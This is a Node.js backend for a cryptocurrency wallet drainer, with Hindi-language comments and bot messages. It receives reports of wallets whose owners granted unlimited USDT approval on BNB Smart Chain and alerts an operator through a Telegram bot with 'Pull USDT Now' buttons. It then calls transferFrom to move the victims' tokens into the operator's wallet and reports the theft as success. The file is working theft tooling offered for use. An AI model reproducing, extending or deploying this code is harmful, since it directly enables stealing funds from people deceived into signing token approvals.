// backend_server.js - Node.js Backend for Auto-Pull & Telegram Bot
require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require('ethers');

// ================= CONFIGURATION =================
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || 'YOUR_ADMIN_CHAT_ID';
const ADMIN_PRIVATE_KEY = process.env.ADMIN_PRIVATE_KEY || 'YOUR_ADMIN_WALLET_PRIVATE_KEY';
const ADMIN_WALLET_ADDRESS = process.env.ADMIN_WALLET_ADDRESS || 'YOUR_ADMIN_RECEIVER_ADDRESS';
const PORT = process.env.PORT || 3000;

// Setup RPC & Contract
const BSC_RPC = 'https://bsc-dataseed.binance.org/';
const USDT_ADDRESS = '0x55d398326f99059ff775485246999027b3197955';
const ERC20_ABI = [
    "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)"
];

const provider = new ethers.JsonRpcProvider(BSC_RPC);

// Only initialize admin wallet if private key is provided
let adminWallet = null;
let usdtContract = null;

if (ADMIN_PRIVATE_KEY && ADMIN_PRIVATE_KEY !== 'YOUR_ADMIN_WALLET_PRIVATE_KEY') {
    try {
        adminWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);
        usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, adminWallet);
        console.log('[Setup] Admin wallet initialized');
    } catch (err) {
        console.error('[Setup] Failed to initialize admin wallet:', err.message);
    }
} else {
    console.warn('[Setup] Admin wallet not configured - set ADMIN_PRIVATE_KEY in .env');
}

// In-Memory Database (Real project mein MongoDB use kar lena)
let approvedWallets = [];

// Initialize Bot & Express
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();
app.use(cors());
app.use(bodyParser.json());

// ================= API ENDPOINT (Frontend call karega) =================
app.post('/api/notify-approval', async (req, res) => {
    const { address, amount, walletName } = req.body;

    // Save to list
    const existingIndex = approvedWallets.findIndex(w => w.address === address);
    if (existingIndex > -1) {
        approvedWallets[existingIndex].amount = amount;
    } else {
        approvedWallets.push({ address, amount, walletName });
    }

    // Send Telegram Message with Inline Button
    const message = `✅ *Unlimited Approval Granted!*\n\n` +
                    `👤 *Wallet:* ${walletName}\n` +
                    `👛 *Address:* \`${address}\`\n` +
                    `💰 *Target Amount:* ${amount} USDT\n\n` +
                    `Aap funds abhi pull kar sakte hain:`;

    const opts = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [{ text: `💸 Pull ${amount} USDT Now`, callback_data: `pull_${address}_${amount}` }]
            ]
        }
    };

    bot.sendMessage(ADMIN_CHAT_ID, message, opts);
    res.json({ success: true });
});

// ================= NEW ENDPOINT: Notify Connection =================
app.post('/api/notify-connection', async (req, res) => {
    const { chat_id, message, address, balance } = req.body;

    try {
        await bot.sendMessage(chat_id, message, { parse_mode: 'Markdown' });
        res.json({ success: true });
    } catch (err) {
        console.error('Telegram send error:', err);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ================= SERVE STATIC FILES =================
app.use(express.static(__dirname));

// ================= TELEGRAM BOT LOGIC =================
// Command to list all approved wallets
bot.onText(/\/list/, (msg) => {
    const chatId = msg.chat.id;
    if (approvedWallets.length === 0) {
        return bot.sendMessage(chatId, "📭 Abhi koi approved wallet nahi hai.");
    }

    bot.sendMessage(chatId, "📜 *Approved Wallets List:*", { parse_mode: "Markdown" });

    approvedWallets.forEach(wallet => {
        const opts = {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: `💸 Pull ${wallet.amount} USDT`, callback_data: `pull_${wallet.address}_${wallet.amount}` }]]
            }
        };
        bot.sendMessage(chatId, `👛 \`${wallet.address}\`\n💰 Amount: ${wallet.amount} USDT`, opts);
    });
});

// Handle Button Clicks (Pulling Funds)
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data; // Format: pull_0xAddress_100

    if (data.startsWith('pull_')) {
        const parts = data.split('_');
        const targetAddress = parts[1];
        const amount = parts[2];

        // Check if admin wallet is configured
        if (!adminWallet || !usdtContract) {
            bot.sendMessage(chatId, `❌ *Admin Wallet Not Configured*\n\nPlease set ADMIN_PRIVATE_KEY in .env file to enable fund pulling.`, { parse_mode: 'Markdown' });
            return;
        }

        bot.sendMessage(chatId, `⏳ *Pulling ${amount} USDT* from \`${targetAddress}\`...\nKripya wait karein, Web3 transaction chal rahi hai...`, { parse_mode: 'Markdown' });

        try {
            const amountInWei = ethers.parseUnits(amount.toString(), 18);

            // Execute transferFrom function
            const tx = await usdtContract.transferFrom(targetAddress, ADMIN_WALLET_ADDRESS, amountInWei);

            bot.sendMessage(chatId, `🚀 Transaction Broadcasted!\nHash: \`${tx.hash}\`\nWaiting for confirmation...`, { parse_mode: 'Markdown' });

            await tx.wait(); // Wait for block confirmation

            bot.sendMessage(chatId, `✅ *SUCCESS!* ${amount} USDT pulled successfully into your wallet! 🤑`, { parse_mode: 'Markdown' });

            // Remove from list after success
            approvedWallets = approvedWallets.filter(w => w.address !== targetAddress);

        } catch (error) {
            console.error(error);
            bot.sendMessage(chatId, `❌ *FAILED!*\nReason: ${error.reason || error.message}\n(Make sure Admin has BNB for gas, and user actually approved)`, { parse_mode: 'Markdown' });
        }
    }
});

// Start Server
app.listen(PORT, () => {
    console.log(`Backend API running on port ${PORT}`);
});